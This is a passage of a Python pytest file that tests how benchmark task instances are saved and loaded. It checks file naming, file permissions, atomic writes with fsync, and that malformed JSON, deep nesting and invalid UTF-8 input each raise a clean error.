    def test_a_path_whose_name_is_not_the_instance_id_is_refused(self, tmp_path):
        """`load_instances` would then fail the WHOLE directory, so one misnamed
        write would break every instance."""
        with pytest.raises(InstanceError, match="file name must be 'psf__requests-2317.json'"):
            dump_instance(make_instance(), tmp_path / "wrong.json")

        assert list(tmp_path.iterdir()) == []

    @pytest.mark.parametrize("name", ["psf__requests-2317.txt", "psf__requests-2317", "psf__requests-2317.json.bak"])
    def test_a_name_without_the_json_suffix_is_refused_too(self, tmp_path, name):
        with pytest.raises(InstanceError, match="file name must be"):
            dump_instance(make_instance(), tmp_path / name)

    def test_the_directory_still_loads_after_a_refused_misnamed_write(self, tmp_path):
        dump_instance(make_instance(), tmp_path / "psf__requests-2317.json")
        with pytest.raises(InstanceError):
            dump_instance(make_instance(), tmp_path / "wrong.json")

        assert set(load_instances(tmp_path)) == {"psf__requests-2317"}

    def test_the_file_is_world_readable_not_0600(self, file):
        """`mkstemp` creates 0600 and `os.replace` keeps it; another uid or a
        bind-mounted reader would get EACCES on a committed instance file."""
        dump_instance(make_instance(), file)

        assert stat.S_IMODE(file.stat().st_mode) == 0o644

    def test_an_overwrite_also_ends_up_0644(self, file):
        file.write_text("{}")
        file.chmod(0o600)

        dump_instance(make_instance(), file)

        assert stat.S_IMODE(file.stat().st_mode) == 0o644

    def test_the_content_is_flushed_to_disk_before_the_rename(self, file, monkeypatch):
        """Without `fsync`, a power loss after the rename can leave a zero-length file."""
        events: list[str] = []
        real_fsync, real_replace = os.fsync, os.replace
        monkeypatch.setattr(os, "fsync", lambda fd: (events.append("fsync"), real_fsync(fd))[1])
        monkeypatch.setattr(os, "replace", lambda a, b: (events.append("replace"), real_replace(a, b))[1])

        dump_instance(make_instance(), file)

        assert events == ["fsync", "replace"]

    def test_a_failed_rename_leaves_no_temporary_and_keeps_the_old_file(self, file, monkeypatch):
        dump_instance(make_instance(version="old"), file)

        def boom(source, destination):
            raise OSError("disk on fire")

        monkeypatch.setattr(os, "replace", boom)

        with pytest.raises(OSError, match="disk on fire"):
            dump_instance(make_instance(version="new"), file)

        assert [p.name for p in file.parent.iterdir()] == [file.name]
        assert load_instance(file).version == "old"

    @pytest.mark.parametrize(
        "overrides",
        [
            {"problem_statement": "bad \ud800 text"},
            {"version": "\udfff"},
            {"repo": "ps\ud800f/requests"},
            {"spec": {"install": ["pip \ud800"]}},
            {"spec": {"\ud800": "key"}},
            {"fail_to_pass": ("tests/x.py::t\ud800",)},
        ],
    )
    def test_a_lone_surrogate_in_any_field_is_an_instance_error(self, file, overrides):
        """Legal in a Python str, unencodable as UTF-8, and it used to escape as a
        raw `UnicodeEncodeError` from `handle.write` for every field but two."""
        with pytest.raises(InstanceError, match="UTF-8"):
            dump_instance(make_instance(**overrides), file)

        assert list(file.parent.iterdir()) == []

    def test_a_circular_spec_is_an_instance_error(self, file):
        looped: dict = {}
        looped["self"] = looped

        with pytest.raises(InstanceError):
            dump_instance(make_instance(spec=looped), file)


class TestEveryLoadFailureIsAnInstanceError:
    """Documented as `InstanceError`-only, so it has to be."""

    def test_an_integer_too_long_for_python_to_parse(self, file):
        file.write_text(json.dumps(as_document()).replace('"issue_number": 2317', '"issue_number": ' + "9" * 5000))

        with pytest.raises(InstanceError, match="not valid JSON"):
            load_instance(file)

    def test_nesting_too_deep_to_recurse_into(self, file):
        file.write_text("[" * 200_000 + "]" * 200_000)

        with pytest.raises(InstanceError, match="not valid JSON"):
            load_instance(file)

    def test_a_deeply_nested_spec_inside_a_valid_document(self, file):
        value: object = "leaf"
        for _ in range(40):
            value = {"k": value}
        write_document(file, {**as_document(), "spec": {"deep": value}})

        with pytest.raises(InstanceError, match="nested more than"):
            load_instance(file)

    def test_a_byte_order_mark(self, file):
        file.write_bytes(b"\xef\xbb\xbf" + json.dumps(as_document()).encode())

        with pytest.raises(InstanceError):
            load_instance(file)

    def test_invalid_utf8(self, file):
        file.write_bytes(b"\xff\xfe{}")

        with pytest.raises(InstanceError, match="cannot read"):
            load_instance(file)

    def test_a_directory_where_a_file_was_expected(self, tmp_path):
        with pytest.raises(InstanceError, match="cannot read"):
            load_instance(tmp_path)
